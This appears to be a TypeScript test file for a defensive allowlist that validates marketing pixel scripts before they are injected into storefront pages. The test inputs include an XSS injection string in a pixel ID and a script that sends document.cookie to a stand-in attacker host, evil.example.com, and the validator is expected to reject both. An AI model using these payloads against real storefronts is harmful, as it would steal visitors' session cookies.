// Pixel provider allowlist — defense-in-depth for storefront pixel injection.
//
// Background (DEEP_SECURITY_CODE_REVIEW §"Pixel scripts run JS via innerHTML"):
//   apps/storefront/src/hooks/usePixels.ts injects <script> tags via
//   `container.innerHTML = html` and then re-executes each <script> by
//   cloning it. The backend `PixelService.buildScripts` already sanitizes
//   individual IDs (a-zA-Z0-9_-), but the script templates are written
//   as full <script>...</script> blocks. If a future template adds a new
//   provider without ID sanitization, or if a malicious actor writes
//   directly to `storePixels` (admin-only but still), arbitrary JS could
//   be delivered to every storefront page.
//
// Strategy:
//   1. Backend stamps each block with `<!-- HAA-PIXEL-PROVIDER: <name> -->`
//      and embeds a known provider signature (global function name) inside
//      the script body.
//   2. Frontend `usePixels.ts` re-validates each <script> against an
//      allowlist of (provider → signature regex) BEFORE cloning it into
//      the live DOM. Any script that doesn't match a known signature is
//      dropped silently and a console.warn is emitted for observability.
//
// This test pins both sides of that contract.

import { describe, it, expect } from 'vitest';
import {
  PixelService,
  PIXEL_PROVIDER_SIGNATURES,
  validatePixelScripts,
} from '../packages/commerce-core/src/pixels.js';

// In-memory fake DB. We don't care about persistence here — only the
// output of `buildScripts`.
function makeDb() {
  return {
    select: () => ({
      from: () => ({
        where: () => ({ limit: async () => [] }),
      }),
    }),
    insert: () => ({ values: () => ({ returning: async () => [] }) }),
    update: () => ({ set: () => ({ where: () => ({ returning: async () => [] }) }) }),
  };
}

describe('Pixel provider allowlist (backend)', () => {
  const svc = new PixelService(makeDb() as any);

  it('exported signature list covers all 7 supported providers', () => {
    const providers = Object.keys(PIXEL_PROVIDER_SIGNATURES).sort();
    expect(providers).toEqual([
      'ga4',
      'gtm',
      'meta',
      'pinterest',
      'snapchat',
      'tiktok',
      'twitter',
    ]);
  });

  it('every signature is a RegExp with at least one alternation', () => {
    for (const [name, sig] of Object.entries(PIXEL_PROVIDER_SIGNATURES)) {
      expect(sig, `signature for ${name}`).toBeInstanceOf(RegExp);
      expect(sig.source).toMatch(/\|/); // multi-token allowlist
    }
  });

  it('buildScripts returns empty when isActive=false', () => {
    const out = svc.buildScripts({ isActive: false } as any);
    expect(out).toEqual({ headScripts: '', bodyScripts: '' });
  });

  it('meta pixel block contains the HAA-PIXEL-PROVIDER marker and fbq signature', () => {
    const out = svc.buildScripts({ isActive: true, metaPixelId: '1234567890' } as any);
    expect(out.headScripts).toMatch(/<!-- HAA-PIXEL-PROVIDER: meta -->/);
    // The provider signature must be embedded inside the script body.
    expect(out.headScripts).toMatch(PIXEL_PROVIDER_SIGNATURES.meta);
    // The sanitized ID must appear.
    expect(out.headScripts).toContain("'1234567890'");
  });

  it('sanitization still rejects shell-breaking characters in IDs', () => {
    const out = svc.buildScripts({
      isActive: true,
      metaPixelId: "1'); alert(1)//",
    } as any);
    // The dangerous chars are stripped by sanitize().
    expect(out.headScripts).not.toMatch(/alert\s*\(/);
    expect(out.headScripts).toContain("'1'); alert(1)//".replace(/[^a-zA-Z0-9_-]/g, ''));
  });

  it('ga4 block stamps ga4 marker and contains gtag signature', () => {
    const out = svc.buildScripts({ isActive: true, ga4MeasurementId: 'G-ABCDEFG' } as any);
    expect(out.headScripts).toMatch(/<!-- HAA-PIXEL-PROVIDER: ga4 -->/);
    expect(out.headScripts).toMatch(PIXEL_PROVIDER_SIGNATURES.ga4);
  });

  it('gtm block stamps gtm marker and includes dataLayer signature', () => {
    const out = svc.buildScripts({ isActive: true, gtmContainerId: 'GTM-PSYQ8X9' } as any);
    expect(out.headScripts).toMatch(/<!-- HAA-PIXEL-PROVIDER: gtm -->/);
    expect(out.headScripts).toMatch(PIXEL_PROVIDER_SIGNATURES.gtm);
    expect(out.bodyScripts).toMatch(/<!-- HAA-PIXEL-PROVIDER: gtm-noscript -->/);
  });
});

describe('Pixel provider allowlist (frontend validator)', () => {
  it('rejects arbitrary script content', () => {
    const html = '<script>alert(1)</script>';
    const result = validatePixelScripts(html);
    expect(result.safe).toBe(false);
    expect(result.reason).toMatch(/no matching provider signature/i);
    expect(result.scriptCount).toBe(1);
  });

  it('rejects script with mismatched provider (meta marker but non-fbq body)', () => {
    const html = `<!-- HAA-PIXEL-PROVIDER: meta -->
<script>fetch('https://evil.example.com?c='+document.cookie)</script>`;
    const result = validatePixelScripts(html);
    expect(result.safe).toBe(false);
  });

  it('accepts meta block with fbq signature', () => {
    const html = `<!-- HAA-PIXEL-PROVIDER: meta -->
<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1234567890');fbq('track','PageView');</script>`;
    const result = validatePixelScripts(html);
    expect(result.safe).toBe(true);
    expect(result.scriptCount).toBe(1);
  });

  it('accepts a full pixel payload (meta + ga4)', () => {
    const out = new PixelService(makeDb() as any).buildScripts({
      isActive: true,
      metaPixelId: '111',
      ga4MeasurementId: 'G-AAA',
    } as any);
    const result = validatePixelScripts(out.headScripts);
    expect(result.safe).toBe(true);
    // Two scripts in the head (Meta inline + GA4 inline). The GA4
    // gtag/js loader is src=... so it does not need to match the
    // signature — but its companion inline does.
    expect(result.scriptCount).toBeGreaterThanOrEqual(2);
  });

  it('handles empty input safely', () => {
    const result = validatePixelScripts('');
    expect(result.safe).toBe(true);
    expect(result.scriptCount).toBe(0);
  });

  it('ignores noscript/iframe content when counting scripts', () => {
    const html = '<noscript><iframe src="https://example.com"></iframe></noscript><script>gtag(\'config\',\'G-AAA\');</script>';
    const result = validatePixelScripts(html);
    expect(result.scriptCount).toBe(1);
    expect(result.safe).toBe(true);
  });
});